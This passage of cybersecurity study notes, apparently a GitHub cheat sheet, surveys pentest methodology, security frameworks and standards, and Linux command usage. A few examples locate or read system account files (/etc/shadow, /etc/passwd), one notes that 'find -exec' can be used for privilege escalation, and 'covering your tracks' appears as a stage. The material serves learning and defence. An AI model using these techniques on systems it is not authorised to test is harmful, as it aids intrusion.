#### Preparing a Password Policy - Real-world Scenario
Let's take a real-world scenario of preparing a password policy.

- **Define Requirements**: Set rules for password length, complexity, and expiration.
- **Usage Guidelines**: Specify unique passwords for each account and prohibit sharing.
- **Storage and Transmission**: Use encryption and secure connections.
- **Change and Reset Guidelines**: Define how often to change passwords.
- **Communication and Monitoring**: Educate employees and monitor compliance.

#### Making an Incident Response Procedure - Real-world Scenario
Now, let's take a real-world scenario of making an incident response procedure.

- **Define Incident Types**: Categorize incidents like unauthorized access or data breaches.
- **Roles and Responsibilities**: Identify key stakeholders.
- **Detailed Steps**: Create a step-by-step guide for each incident type.
- **Reporting and Documentation**: Keep records for future reference.
- **Communication and Review**: Make sure procedures are understood and periodically updated.


### Penetration Tests
Before a penetration test starts, a formal discussion occurs between the penetration tester and the system owner. Various tools, techniques, and systems to be tested are agreed on. This discussion forms the scope of the penetration testing agreement and will determine the course the penetration test takes.

### Rules of Engagement (ROE)
The ROE is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections:
* Permission
* Test scope
* Rules

## Security Assessment Frameworks and Methodologies
### Penetration Testing Methodologies
The steps a penetration tester takes during an engagement is known as the methodology. All of them have a general theme of the following stages:

| Stage | Description |
|---|---|
| Information Gathering | This stage involves collecting as much publically accessible information about a target/organisation as possible, for example, OSINT and research.  **Note**: This does not involve scanning any systems. |
| Enumeration/Scanning | This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable. |
| Exploitation | This stage involves leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic. |
| Privilege Escalation | Once you have successfully exploited a system or application (known as a foothold), this stage is the attempt to expand your access to a system. You can escalate horizontally and vertically, where horizontally is accessing another account of the same permission group (i.e. another user), whereas vertically is that of another permission group (i.e. an administrator). |
| Post-exploitation | This stage involves a few sub-stages: <ol><li>What other hosts can be targeted (pivoting)</li><li>What additional information can we gather from the host now that we are a privileged user</li><li>Covering your tracks</li><li>Reporting</li></ol> |

### Black, Grey & White Box Testing
There are three primary scopes when testing an application or service. 

| Box | Description |
|---|---|
| Black | This testing process is a high-level process where the tester is not given any information about the inner workings of the application or service. |
| Grey | The tester will have some limited knowledge of the internal components of the application or piece of software. |
| White | The tester will have full knowledge of the application and its expected behaviour. |

### OSSTMM
The [Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf) provides a detailed framework of testing strategies for systems, software, applications, communications and the human aspect of cybersecurity.

### OWASP
OWASP, the [Open Web Application Security Project](https://owasp.org/), is a nonprofit foundation that works to improve software security. It provides free, openly available articles, methodologies, documentation, tools, and technologies in the field of web application security. 

OWASP is known for its widely-referenced [OWASP Top 10](https://owasp.org/www-project-top-ten/), a standard awareness document for developers and web application security that lists the most critical security risks to web applications.

### NIST Cybersecurity Framework 2.0
The [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats.

The framework is divided into six core functions: 
* **Govern**: Establish oversight to manage and reduce cybersecurity risks across the organization.
* **Identify**: Understand your systems, assets, and risks.
* **Protect**: Implement safeguards to ensure services' security.
* **Detect**: Identify cybersecurity threats and breaches in real-time.
* **Respond**: Take action when cybersecurity events are detected.
* **Recover**: Restore operations and improve resilience post-incident.

### NCSC CAF
The NCSC [Cyber Assessment Framework (CAF)](https://www.ncsc.gov.uk/collection/caf) is a structured guide designed to ensure the security of organizations, particularly those part of the Critical National Infrastructure. 

The CAF aligns with NIS regulations and is structured around 14 objectives, categorized into four main goals: managing security risk, protecting against cyber attacks, detecting cybersecurity events, and minimizing the impact of incidents. It provides comprehensive indicators of good practice for organizations to assess and improve their security posture

### Mitre ATT&CK
The [MITRE ATT&CK](https://attack.mitre.org/) framework is a knowledge base of adversary tactics and techniques based on real-world observations. It is used as a foundation for the development of specific threat models and methodologies in the private sector, government, and the cybersecurity product and service community.

### Unified Kill Chain
The Unified Kill Chain is a framework that combines the Lockheed Martin Cyber Kill Chain and the MITRE ATT&CK framework to provide a comprehensive view of the cyber kill chain. It is designed to help organizations understand and respond to cyber threats more effectively.

The Unified Kill Chain consists of the following stages:
1. **Reconnaissance**: Gathering information about the target.
2. **Weaponization**: Developing or obtaining the tools needed to exploit vulnerabilities.
3. **Delivery**: Delivering the weaponized payload to the target.
4. **Exploitation**: Exploiting vulnerabilities to gain access to the target.
5. **Installation**: Installing malware or other tools to maintain access to the target.
6. **Command and Control**: Establishing communication channels to control the compromised system.
7. **Actions on Objectives**: Achieving the attacker's goals, such as stealing data or disrupting operations.

See the 18 phases of attack [here](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf).

## Global Security Standards
### ISO/IEC 19249
ISO/IEC 19249 outlines architectural and design principles for creating secure IT products and systems
1. **Least Privilege**: This principle emphasizes providing the minimum permissions necessary for individuals or entities to perform their tasks. (Design Principle: 1)
2. **Attack Surface Minimization**: It focuses on reducing the potential points of attack by eliminating unnecessary services and reducing vulnerabilities. (Design Principle: 2)
3. **Centralized Parameter Validation**: This principle suggests centralizing the validation of input parameters to prevent threats that may exploit vulnerabilities. (Design Principle: 3)
4. **Centralized General Security Services**: It advocates for centralizing security services such as authentication to enhance control and reduce potential points of failure. (Design Principle: 4)
5. **Preparing for Error and Exception Handling**: This principle emphasizes designing systems to handle errors and exceptions gracefully and securely, ensuring they do not leak sensitive information. (Design Principle: 5)

The five architectural principles outlined in ISO/IEC 19249:

1. **Domain Separation**: Components are grouped into distinct entities, each with its own domain and set of security attributes. This separation helps control access and privileges. (Architectural Principle: 1)
2. **Layering**: The system is structured into abstract levels or layers, enabling the imposition of security policies at different levels and facilitating validation of system operations. (Architectural Principle: 2)
3. **Encapsulation**: Involves hiding low-level implementations and preventing direct manipulation of data by providing specific methods, similar to object-oriented programming, to ensure data integrity. (Architectural Principle: 3)
4. **Redundancy**: Ensures availability and integrity by implementing redundancy measures. Examples include redundant power supplies or RAID configurations in data storage. (Architectural Principle: 4)
5. **Virtualization**: Sharing a single set of hardware among multiple operating systems, which enhances security boundaries and containment of malicious programs, particularly relevant in the context of cloud services. (Architectural Principle: 5)

### ISO27001
ISO (the International Organization for Standardization) is a worldwide federation of national standards bodies (ISO member bodies), where ISO27001 is an international standard on how to manage information security.

An ISMS consists of the policies, procedures, guidelines, and associated resources and activities, collectively managed by an organization, in the pursuit of protecting its information assets. 

It is a systematic approach for establishing, implementing, operating, monitoring, reviewing, maintaining and improving an organization’s information security to achieve business objectives. It is based on a risk assessment and the organization’s risk acceptance levels designed to effectively treat and manage risks.

## Operational Roles and Career Development
### Hat Categories
Hackers are sorted into three hats, where their ethics and motivations behind their actions determine what hat category they are placed into.
| Hat | Description |
|---|---|
| Black hat | These people are criminals and often seek to damage organisations or gain some form of financial benefit at the cost of others. |
| Grey hat | These people use their skills to benefit others often; however, they do not respect/follow the law or ethical standards at all times. |
| White hat | These hackers are considered the "good people". They remain within the law and use their skills to benefit others. |

### Career paths
| Career | Description |
|---|---|
| Security Analyst | Responsible for maintaining the security of an organisation's data |
| Security Engineer | Design, monitor and maintain security controls, networks, and systems to help prevent cyberattacks |
| Incident Responder | Identifies and mitigates attacks whilst an attackers operations are still unfolding |
| Digital Forensics Examiner | Responsible for using digital forensics to investigate incidents and crimes |
| Malware Analyst | Analyses all types of malware to learn more about how they work and what they do |
| Penetration Tester | Responsible for testing technology products for security loopholes |
| Red Teamer | Plays the role of an adversary, attacking an organisation and providing feedback from an enemies perspective |

# Linux Commands 
Essential command-line tools for cybersecurity work as well as some other external tools that are useful for various tasks.

<details>
<summary>List of contents</summary>

1. [File & Directory Management](#file--directory-management)
2. [User & Permission Management](#user--permission-management)

</details>

##  <!-- File & Directory Management -->
<h1 align="center">File & Directory Management</h1>

In this section: [pwd](#pwd), [ls](#ls), [tree](#tree), [mkdir](#mkdir), [touch](#touch), [cat](#cat), [stat](#stat), [mv](#mv), [rm](#rm), [ln (symbolic links)](#ln-symbolic-links), [apt](#apt), [Operators](#operators), [File Descriptors](#file-descriptors)

<Details open>
<summary>Hide File & Directory Management Commands</summary>

## pwd
Find the full Path to our current working directory

```bash
pwd
```
## ls
List files and directories.
```bash
ls 
```
**Key options**:   
`-l` = long listing format  
`-a` = include hidden files (starting with `.`)  
`-h` = human-readable sizes (e.g., KB, MB)  
`-t` = sort by modification time (newest first)  
`-r` = reverse order of sort  
`-S` = sort by file size

You can combine options, e.g., `ls -lahtrS`
## tree
Displays the directory structure in a tree-like format.

```bash
tree -a 
```
**Key options:**  
`-a` = show hidden files  
`-d` = list directories only  
`-L <level>` = limit the depth of the directory tree displayed  
`-h` = human-readable sizes  
`-f` = print the full path prefix for each file 
## mkdir
Used for creating directories.

```bash
mkdir <name>
```
**Key options**:  
`-p` = create parent directories as needed (e.g., `mkdir -p Folder/i/am/in`)   
`-v` = verbose output, showing created directories
## touch
Used to create an empty file.

```bash
touch <filename>
```
## cat
Display file contents or combine multiple files.

```bash
cat file.txt            # Show file contents
cat -b file.txt         # Show line numbers for non-blank lines (-n for all)
```

**Key options**:  
`-n` = show numbers  
`-b` = show numbers for non-blank lines 
## stat
Displays detailed information about given files or file systems. 

```bash
stat file.txt
```

**These informations can be:** file name, file size, blocks, type, inode, UID, GID, access, modify, change and creation times.
## mv
Move or rename files and directories.

```bash
mv source.txt destination.txt  # Rename a file
mv file.txt /tmp               # Move a file to another directory
```
## rm
Used to remove files or directories.

```bash
rm file.txt       # Remove a file
rm -r directory/  # Remove a directory and its contents
rm -rf /tmp/*     # Remove all files in /tmp directory
```
**Key options**:  
`-v` = Verbose output, showing what is being removed  
`-r` = Deletes every file in the directory   
`-f` = Suppresses all warning prompts 
## ln (symbolic links)
Creates symbolic links (shortcuts) to files or directories.

```bash
ln -s /root/flag.txt flag
```

This creates a symbolic link named `flag` that points to the file `/root/flag.txt`.

You can also use it with other commands, such as `cat` to read the contents of the file through the symbolic link:
```bash
cat flag 
```
Which will display the contents of the file `/root/flag.txt`.
## apt
apt is a command-line utility for installing, updating, removing, and otherwise managing debian packages.

```bash 
sudo apt update                 # Update the package list
sudo apt upgrade                # Upgrade installed packages
sudo apt full-upgrade           # Full upgrade (may remove packages if necessary)
sudo apt install <package_name> # Install a package
sudo apt remove <package_name>  # Remove a package
sudo apt autoremove             # Remove unused packages
sudo apt list --installed       # List installed packages
```
## Operators
`>` redirects command output to a file, replacing its contents.  
`>>` appends command output to the end of a file, keeping existing data.  
`|` pipes the output of one command as input to another command.
## File Descriptors
In Unix-like operating systems, file descriptors are integer handles used to access files or input/output streams. The standard file descriptors are:

**Data Stream for Input**  → `STDIN – 0`  
**Data Stream for Output** → `STDOUT – 1`  
**Data Stream for Output that relates to an error occurring.** →`STDERR – 2`  

To redirect Redirect STDERR to /dev/null, which is a special file that discards all data written to it, you add `2>/dev/null` to your command. This is useful for suppressing error messages.
```bash 
find /etc/ -name shadow 2>/dev/null 
```

**Redirect STDOUT and STDERR to Separate Files**  
```bash
find /etc/ -name shadow 2> stderr.txt 1> stdout.txt
```

</Details>

##  <!-- User & Permission Management -->
<h1 align="center">User & Permission Management</h1>

In this section: [whoami](#whoami), [adduser & addgroup](#adduser--addgroup), [chmod](#chmod), [chown](#chown), [sudo](#sudo)

<Details open>
<summary>Hide User & Permission Management Commands</summary>

## whoami
See the current user that is logged in to the system.

```bash
whoami
```
## adduser & addgroup
In Linux, `adduser` and `addgroup` are commands used to create new users and groups, respectively.

The syntax for both of these commands are `adduser username` and `addgroup groupname`.

Add a user to a group  
```bash
usermod -a -G groupname username
```
> You can add a user to multiple groups by separating the group names with commas.
## chmod
Chmod allows you to change the permissions of a file or directory.

```bash
chmod <permissions> <file>
```

**Permissions**
| Digit    |      Meaning   | 
|----------|:-------------:|
| 1  | That file can be executed |
| 2  | That file can be written to   | 
| 3  | That file can be executed and written to |
| 4  | That file can be read |
| 5  | That file can be read and executed |
| 6  | That file can be written to and read |
| 7  | That file can be read, written to, and executed |

To make a binary file just executable for the owner of the file, you can use:  
```bash
chmod u+x file.txt
```
## chown
Change the owner and/or group of a file or directory.

```bash
chown <user>:<group> <file>

# Example
chown root:admin file.txt  # Change owner to root and group to admin
```

**Key options:**  
`-R` = recursively change ownership of files and directories within a directory  
`-v` = verbose output, showing what is being changed  
## sudo
Sudo allows a permitted user to execute a command as the superuser or another user, as specified by the security policy.

```bash
sudo [options] command

# Example usage
sudo ls /root           # List files in the /root directory as root user
sudo -u <user> command  # Run a command as a different user
sudo su                 # Switch to root user
sudo -l                 # List current sudo privileges
```

**Key options:**  
`-u <user>` = specify user   
`su` = change to root  
`-l` = list current sudo priviliges   

</Details>

##  <!-- Process & System Monitoring -->
<h1 align="center">Process & System Monitoring</h1>

In this section: [ps](#ps), [top](#top), [htop](#htop), [lsof](#lsof), [kill](#kill), [free](#free), [df](#df), [du](#du), [ncdu](#ncdu), [history](#history), [uname](#uname)

<Details open>
<summary>Hide Process & System Monitoring Commands</summary>

## ps
Show the current running processes.

```bash
ps aux 

# PID = Process ID
# TTY = Terminal type
# TIME = CPU time used by the process
# CMD = Command that launched the process
``` 

**Key options**:   
`-f` = full format listing  
`-o` = user-defined output format (e.g., `ps -eo pid,comm`)   
`-a` = all processes from all users   
`-u` user-oriented format  
`-x` will display all processes even those not associated with the current tty  
`-t` Processes associated with the terminal run
## top
top command is used to show the Linux processes. It provides a dynamic real-time view of the running system

```bash
top
```

**Key options**:  
`-i <seconds>` = delay between updates (default is 3 seconds)  
## htop
[htop](https://htop.dev/) is an interactive process viewer for Unix systems.

```bash
htop -d 10    # Show processes with a delay of 10 tenths of seconds
htop -u john  # Show processes owned by a specific user e.g. john
```

**Key options**:  
`-C` Use colors in the output  
`-d` Delay between updates, in tenths of seconds  
`-u` Show only processes owned by a specified user  
`-p` Show only processes with specified process IDs  
`-s` Sort by specified column (use --sort-key help for a list)  
`-t` Tree view  
`-U` Do not use unicode but plain ASCII
## lsof
Displays information about files opened by processes. It can be used to identify which processes are using specific files, network connections, or devices.

```bash
lsof /etc/passwd        # Show processes using the /etc/passwd file
lsof -i :80             # Show processes using port 80 (HTTP)
lsof -i | grep openvpn  # Show openvpn processes
```

**Key options**:   
`-i` = Show network connections (e.g., `lsof -i :80` for port 80)    
`-u` = Show files opened by a specific user (e.g., `lsof -u username`)   
`-p <PID>` = Show files opened by a specific process ID  
`-n` = Show numerical addresses instead of resolving hostnames
## kill
Used for terminating processes by their Process ID (PID).

```bash
kill <PID>          # Terminate a process by PID
kill -9 <PID>       # Forcefully terminate a process by PID
```

**The most commonly used signals:**  
1 (HUP) - Reload a process.  
9 (KILL) - Kill a process.  
15 (TERM) - Gracefully stop a process.
## free
Displays memory usage statistics.

```bash
free -h 
```

**Options:**  
`-b` = to display the amount of memory in bytes  
`-k` = to display the amount of memory in kilobytes  
`-m` = to display the amount of memory in megabytes  
`-g` = to display the amount of memory in gigabytes  
`-h` = to display the amount of memory in a human-readable format  
`-s <sec>` = to update the output every X seconds
## df
Shows disk space usage of file systems.

```bash
df -h     # Show disk space usage in human-readable format  
df -i     # Show inode usage
df -BG    # Show disk space usage in gigabytes
```

**Key options:**  
`--block-size=SIZE` = scale sizes by SIZE. E.g., `-BM` prints sizes in units of 1,048,576 bytes.  
`--exclude-type=TYPE` = exclude file systems of type TYPE  
`-h` = print sizes in human readable format (e.g., 1K 234M 2G)    
`-T` = print file system type  
`-t` = limit listing to file systems of type TYPE  
## du
Estimates file and directory space usage.

```bash
du -sh BreachCompilation  # Show total size of the BreachCompilation directory
```

**Key options:**  
`-a` = to display an entry for each file in a file hierarchy  
`-c` = displays total size at the end  
`-d <number>` = to specify the depth of the directory tree to be displayed  
`-h` = to get a human-readable output  
`-L` = dereference all symbolic links  
`-s` = to get the total size of the directory  
`--time` get the results with timestamps of last modification
## ncdu
Disk usage analyzer with an ncurses interface (Part of the ncdu suite).

```bash
ncdu -x --si <file_or_directory>
```

**Options:**    
`-x` = This option prevents ncdu from following symbolic links.  
`--si` =  This option makes ncdu use powers of 1000 instead of 1024 for sizes.  
## history
Displays a list of commands used in the terminal session

```bash
history 
```
## uname
See basic information about the operating system name and system hardware.

```bash
uname -a 
```

**Key options:**  
`-a` = print all information  
`-s` = print the kernel name  
`-n` = print the network node hostname  
`-r` = print the kernel release  
`-v` = print the kernel version  
`-m` = print the machine hardware name  
`-p` = print the processor type (if available)  
`-o` = print the operating system name
## neofetch
[Neofetch](https://github.com/dylanaraps/neofetch) displays information about your operating system, software and hardware in an aesthetic and visually pleasing way.

Install: `sudo apt install neofetch` or see [here](https://github.com/dylanaraps/neofetch/wiki/Installation).

```bash
neofetch
```

</Details>

##  <!-- File Inspection & Forensics -->
<h1 align="center">File Inspection & Forensics</h1>

In this section: [file](#file), [strings](#strings), [exiftool](#exiftool), [hexdump](#hexdump), [xxd](#xxd), [objdump](#objdump), [hexeditor](#hexeditor), [binwalk](#binwalk)

<Details open>
<summary>Hide File Inspection & Forensics Commands</summary>

## file
The `file` command is used to determine the type of a file by examining its contents rather than relying on file extensions.

```bash
file <file_name>
```
## strings
strings is a command-line utility that extracts printable strings from binary files. It is commonly used to find human-readable text in executables, libraries, and other binary files.

```bash
strings [options] <file>

# Example usage
strings -a file.bin  # Extract all printable strings from file.bin
```
## exiftool
Is a command-line application for reading, writing and editing meta information in a wide variety of files.

Install with: `sudo apt install libimage-exiftool-perl`

```bash
exiftool [options] <file>

# To view metadata of a file
exiftool file.jpeg 

 # Remove all metadata from the file
exiftool -all= file.jpeg

# To add GPS metadata to an image
exiftool \
-GPSLatitude=51.500718 \
-GPSLatitudeRef=N \
-GPSLongitude=-0.124614 \
-GPSLongitudeRef=W \
-file image.png

# To add a comment to an image
exiftool -Comment="London trip." image.png

# To add a user comment to an image
exiftool -UserComment="Super cool!" image.png
```

**Key options:**  
`-all=` = remove all metadata from the file  
`-s` = short output format  
`-h` = HTML output format  
`-json` = JSON output format  
`-r` = recursive processing of directories  
`-overwrite_original` = overwrite the original file with the modified file
## hexdump
hexdump is used to filter and display the specified files, or standard input in a human readable specified format.  

```bash
hexdump [options] {files}

# Example usage
hexdump -C file.txt
```

**Key options**  
`-C` = Canonical hex + ASCII display.  
`-c` = One-byte character display.  
`-d` = Decimal display.  
`-e <FORMAT>` = Specify the output format.  
`-n <N>` = Stop after reading N bytes.  
`-s <OFFSET>` = Start reading at OFFSET bytes.  
`-v` = Display all data, even if it is repeated.
## xxd
xxd is a hex editor that can be used to convert binary files to hex and vice versa.

```bash
xxd [options] [infile [outfile]]

# Example usage
xxd -p file.txt  # Convert file.txt to plain hex dump
```

**Key options**    
`-b` = binary digit dump  
`-p` = plain hex dump (continuous string)  
`-e` = little-endian dump  
`-l <LEN>` = stop after <len> octets.  
`-r` = hex dump to binary (plain text)  
`-d` = show offset in decimal instead of hex.  
`-u` = use upper case hex letters.  
`-i` = output in C include file style.  
`-s` = start at offset.  
## objdump
objdump is a command-line utility that displays information about one or more object files. It can be used to disassemble object files, executable files, shared libraries, and core dumps.

```bash
objdump [options] <file>

# Dumps the disassembly of the file
objdump -d file 

# Get the return address  
objdump -d file | grep ret
```

**Key options:**  
`-d` = disassemble the file  
`-s` = display the full contents of the file  
`-t` = display the symbol table  
`-x` = display all headers and sections  
`-f` = display the file header information  
`-h` = display the section headers
## hexeditor
Read and modify binary files in hexadecimal format.

```bash
hexeditor [options] <file>

# Example usage
hexeditor -n file.txt
```

**Key options**  
`-a` Print all text characters.  
`-n` Force Gray scale, no colors.

**-- Shortcuts --**  
**CTRL + F** = Go to last line  
**CTRL + C** = Exit without saving  
**CTRL + X** = Exit and save  
**CTRL + U** = Undo  
**CTRL + W** = Search
## binwalk
Binwalk allows users to analyze and extract firmware images and helps in identifying code, files, and other information embedded in those, or inside another file.

```bash
binwalk [options] <file>

# Example usage
binwalk -e firmware.bin # Extract files from firmware.bin
binwalk -Me firmware.bin # Recursively scan extracted files (matryoshka)
```

**Key options:**  
`-e` = Extract files  
`-M` = Recursively scan extracted files (matryoshka)  
`-v` = Verbose output  
`-q` = Quiet output (suppress non-error messages) 

</Details>

##  <!-- Searching & Text Processing -->
<h1 align="center">Searching & Text Processing</h1>

In this section: [find](#find), [where](#where), [locate](#locate), [whatis](#whatis), [apropos](#apropos), [grep](#grep), [uniq](#uniq), [sort](#sort), [diff](#diff), [tail/head](#tailhead), [wc](#wc), [cut](#cut), [tr](#tr), [column](#column), [jq](#jq), [sed](#sed), [awk](#awk)

<Details open>
<summary>Hide Searching & Text Processing Commands</summary>

## find
Used to search and locate files and directories based on various criterias.

Syntax: `find <location> <options>`

```bash
find / -name "*.txt"                    # Find all .txt files in the specified path
find / -group users -type f              # Find files owned by the 'users' group
find / -type f -name "passwords.txt"    # Find a specific file by name
find / -name "*.txt"                    # Find any file with the extension .txt
find / -type d -name "backup"           # Find directories named "backup"
find / -type f -perm 644                # Find files with specific permissions (e.g., 644)
find / -type f -user root               # Find files owned by the root user
find / -type f -size +1M                # Find files larger than 1 megabyte

#Find config files larger than 25KB and newer than a specific date
find / -type f -size +25k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null 
```

**Key options**  
`-name` = specify file specific name/descriptions to be found  
`-iname` = Like -name, but the match is case insensitive.  
`-print` = It prints the pathname of the current file to standard output.  
`-regex` = True if the whole path of the file matches pattern using expression   
`-type` = With -type, you can use d to only find directories, and f to only find files.  
`-user` = specify owner  
`-size` = specify size  
`-perm` = specify permissions  
`-exec` = Execute a command on the found files. The command must end with `\;`    
`-newer` = Find files that are newer than a specified file.  
`-newermt` = Find files modified after a specific date.  

**Location specific options**   
No specification = current folder  
`/` = root folder  
`.` = this folder and its subdirectories  

**Time specific options**  
`-amin <n>` = Access time in minutes.  
`-mmin <n>` = Modification time in minutes.  
`-ctime <n>` = Change time in minutes.  
`-atime <n>` = Access time in days.  
`-mtime <n>` = Modification time in days.  
`-ctime <n>` = Change time in days.

To put it all together: in order to specify that a file was last accessed more than 30 minutes ago, the option `-amin +30` is used. 

To specify that it was modified less than 7 days ago, the option `-mtime -7` is used. 

When you want to specify that a file was modified within the last 24 hours, the option `-mtime 0` is used.

**Note**  
1. Suppress the output of any possible errors to make the output more readable. This is done by appending `2> /dev/null` to your command. This way, you won't see any results you're not allowed to access.
2. The second thing is the `-exec` flag. You can use it in your find command to execute a new command, following the -exec flag, like so: `-exec whoami \;`. (can be used for privilege escalation)'
## where
Returns the path to the file or link that should be executed.

```bash
where <command>
```

> Good for finding the location of a command or executable file in the system.
## locate
This tool is used to find files by their name.

```bash
locate <file_name>
```
## whatis
Returns a a short description of a command.

```bash 
whatis <command>
```
## apropos
Used to search for a command by its description.

```bash
apropos hexeditor       # Search for commands related to hex editors
```
## grep
Searching plain-text data for lines that match an expression. It is commonly used to search through files or output from other commands.

```bash
# Basic usage
grep "search_term" file.txt  # Search for a specific term in a file

# ----- Example usage -----
# Search for a specific term in a file and show line numbers
grep -n "search_term" file.txt  

# Search recursively in all files in a directory
grep -R "search_term" /path/to/directory  # or '.' for current directory

# Search for an ip using regular expressions  
`grep -Eo '[0–9]{1,3}\.[0–9]{1,3}\.[0–9]{1,3}\.[0–9]{1,3}'`  

# Search for binaries (ex. "/usr/bin/sudo")  
`grep '^/.../.../....$'` 

# Grep for CTF flag version 1  
`grep -oi '\S*flag\S*' <path>`

# Grep for CTF flag version 2  
`grep "flag{.*}"`
```

**Key options**  
`-i` = ignore case (case insensitive search)    
`-o` = show only the matching part of the line  
`-l` = show only the names of files with matching lines  
`-c` = count the number of matching lines  
`-n` = line numbers for every string found  
`-w` = match whole words only  
`-x` = match whole lines only  
`-E` = regular expressions  
`-R` = recursive grep  
## uniq
Remove duplicate lines from a sorted file.

```bash
uniq file.txt # Remove duplicate lines from file.txt
uniq -c file.txt # Count occurrences of each line
uniq -d file.txt # Print only duplicate lines
uniq -u file.txt # Print only unique lines
```

**Key options**  
`-c` = count the number of occurrences of each line  
`-d` = only print duplicate lines  
`-u` = only print unique lines  
`-i` = to ignore case  
## sort
Sorts lines of text files.

```bash
sort file.txt                 # Sort lines in file.txt
sort -r file.txt              # Sort lines in reverse order
sort -n file.txt              # Sort lines numerically
sort -u file.txt              # Sort lines and remove duplicates
sort -b file.txt              # Ignore leading blanks
sort -o sorted.txt file.txt   # Sort lines and write output to sorted.txt
```

**Options:**   
`-b` = ignore leading blanks  
`-c` = check if the file is sorted   
`-r` = to sort in reverse order  
`-o` = to write output to a file  
`-u` = sort and remove duplicate lines  
`-n` = to sort numerically   
`-g` = to sort general-numeric  
`-h` = to sort human readable numbers  
`-f` = ignore case  
## diff
Compares files line by line and shows differences.

```bash
diff file1.txt file2.txt  # Compare two files
diff -u file1.txt file2.txt  # Unified diff format
diff -i file1.txt file2.txt  # Ignore case differences
diff -w file1.txt file2.txt  # Ignore all white space
```
**Key options:**  
`-u` = unified diff format (shows context)  
`-c` = context diff format (shows more context)  
`-i` = ignore case differences  
`-w` = ignore all white space  
`-b` = ignore changes in the amount of white space  
`-B` = ignore changes whose lines are all blank
## tail/head
`tail` and `head` commands are used to display the beginning or end of a file.

```bash
head file.txt          # Show the first 10 lines of file.txt
tail file.txt          # Show the last 10 lines of file.txt

head -n 5 file.txt     # Show the first 5 lines of file.txt
tail -n 5 file.txt     # Show the last 5 lines of file.txt

# Live tailing of a file
tail -f file.txt       # Follow the file and display new lines as they are added

# Sorting
head -n 20 file.txt | sort -r  # Show the first 20 lines and sort them in reverse order
```

**Key options:**  
`-n <number>` = number of lines to show  
`-c <numbers>` = number of bytes  
## wc
Count lines, words, and characters in files.

```bash
wc file.txt
```

**Key options**  
`-l` = count number of lines  
`-w` = count number of words  
`-c` = count number of bytes  
`-m` = count number of characters  
## cut
Extract sections from each line of input files or standard input.

```bash
cut <OPTION> <FILE>

# Extract the first field from a file using ':' as a delimiter
cut -d':' -f1 /etc/passwd  
```

**Key options**  
`-f` = Select by specifying a field, a set of fields, or a range of fields.  
`-c` = Select by specifying a character, a set of characters, or a range of characters.  
`-d` = Specify a delimiter that will be used instead of the default “TAB” delimiter.  
## tr
Tool used to replace, delete, or squeeze repeated characters.

```bash
tr [options] SET1 [SET2]

# Replace all occurrences of ':' with ' '
tr ':' ' ' < file.txt

# Delete all digits from a file
tr -d '0-9' < file.txt

# Squeeze repeated spaces into a single space
tr -s ' ' < file.txt

# Convert lowercase letters to uppercase
tr 'a-z' 'A-Z' < file.txt
```

**Key options**    
`-d` delete characters  
`-s` squeeze repeated characters
## column
The `column` command formats text input into a table-like structure, aligning columns based on whitespace or a specified delimiter.

```bash
column -t file.txt

# Format output from a command into columns
echo -e "Name:Age\nAlice:30\nBob:25" | column -t
```
## jq
jq is a lightweight and flexible command-line JSON processor. It is used to parse, filter, and transform JSON data. 

To install use `sudo apt install jq`

```bash
jq <options> <filter> <input>

# Prettify JSON data
jq . sample.json 

# Another way of prettifying JSON data (most common)
cat sample.json | jq

# Minify JSON data
jq -c < pretty.json  # Minify JSON data from pretty.json
```

**Key options:**  
`-c` = compact output (minified JSON)  
`-r` = raw output (without quotes)  
`-s` = read input as an array of JSON objects  
`-f <file>` = read filter from a file   
## sed  
Sed is a stream editor that can perform basic text transformations on an input stream (a file or input from a pipeline). It is commonly used for text substitution, deletion, and insertion.

```bash
# Replace the first occurrence of 'pattern' with 'replacement' in file.txt
sed 's/pattern/replacement/' file.txt

# Replace all occurrences of 'pattern' with 'replacement'
sed 's/pattern/replacement/g' file.txt

# Format trailing space with a colon  
sed 's/ */:/g' file.txt

# Only get alphanumeric values  
sed 's/[[:digit:]]//g' file.txt
```

The "s" flag at the beginning stands for the substitute command. Then we specify the pattern we want to replace. After the slash (/), we enter the pattern we want to use as a replacement in the third position. Finally, we use the "g" flag, which stands for replacing all matches.  
## awk
Manipulate and analyze text files. It is particularly useful for processing structured data, such as CSV files or log files.

```bash
# Print the first and second fields of each line in file.txt
awk '{print $1, $2}' file.txt 

# Print the first and third fields of /etc/passwd
awk -F: '{print $1, $3}' /etc/passwd 
```

**Key options:**  
`-F` = specify the field separator (default is whitespace)  
`-v` = assign a variable value before processing the input  
`-o` = output file (not commonly used)

**Commonly used variables:**  
`$0` = Represents the entire line of text.  
`$1`, `$2`, ... = Represents the first, second, etc., fields in the line.  
`$NF` = Represents the last field in the line.  
`$NR` = Represents the current record number (line number).  
`$FS` = Field separator (default is whitespace).  
`$RS` = Record separator (default is newline).  
`$OFS` = Output field separator (default is space).  
`$ORS` = Output record separator (default is newline).  
`/<pattern>/` = Represents a pattern to match in the input. 

<details>
<summary>Advanced examples</summary> <br>

```bash	 
# Split on space
awk -F: '{RS=" "} {print $1}'

# Print the first and third field of the /etc/passwd file
awk -F: '{print $1, $3}' /etc/passwd

# Print the first and third field of a file, split on "o" and print the total number of rows
awk 'BEGIN {FS="o"} {print $1,$3} END{print "Total Rows=",NR}' 

# Print the first and fourth field of file and print as "Name:ID"
awk 'BEGIN {FS=" "; OFS=":"} {print $1,$4}' file.txt
ippsec:34024
john:50024
thecybermentor:25923
liveoverflow:45345
nahamsec:12365
stok:1234

# Print the first field of a file and separate with a comma
awk 'BEGIN {ORS=","} {print $1}' file.txt
ippsec,john,thecybermentor,liveoverflow,nahamsec,stok
```
</details>

</Details>

##  <!-- Networking Tools -->
<h1 align="center">Networking Tools</h1>


In this section: [ip](#ip), [ping](#ping), [traceroute](#traceroute), [telnet](#telnet), [curl](#curl), [wget](#wget), [ftp](#ftp), [ssh](#ssh), [scp](#scp), [xfreerdp](#xfreerdp), [netdiscover](#netdiscover), [netstat](#netstat), [ss](#ss), [tcpdump](#tcpdump), [dig](#dig), [wash](#wash), [whatweb](#whatweb)

<Details open>
<summary>Hide Networking Tools Commands</summary>

## ip
The `ip` command is used to show and manipulate routing, devices, policy routing, and tunnels. It is a powerful tool for managing network interfaces and configurations.

